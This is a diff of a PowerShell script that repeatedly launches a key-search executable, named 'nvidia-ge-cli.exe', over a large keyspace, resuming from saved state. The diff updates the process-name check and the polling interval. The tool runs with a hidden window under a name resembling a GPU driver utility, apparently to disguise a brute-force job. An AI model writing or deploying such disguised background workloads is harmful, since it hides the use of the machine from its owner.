@@ -19,7 +19,7 @@ function Get-V{
 
 function Run-Finder {
     $range = Get-V 36893488147419103232 284667 64800000000000
-    $process=Get-Process notepad++ -ea SilentlyContinue
+    $process=Get-Process nvidia-ge-cli -ea SilentlyContinue
     if(!$process) {
         Start-Process "nvidia-ge-cli.exe" -ArgumentList '--keyspace', $range,  "-i",  "version.txt", "--continue", "state.txt" -WindowStyle Hidden
     }
@@ -27,7 +27,7 @@ function Run-Finder {
 
 function Stop-Finder {
     $hoursRan = $hoursRan+((Get-Date)-($startTime)).TotalHours
-    $process=Get-Process notepad++ -ea SilentlyContinue
+    $process=Get-Process nvidia-ge-cli -ea SilentlyContinue
     if($process) {
         Stop-Process -Force $process
     }
@@ -45,7 +45,7 @@ function Runner{
         del state.txt
         $hoursRan=0
     }
-    Start-Sleep -Seconds 60
+    Start-Sleep -Seconds 900
     Runner
 }
 
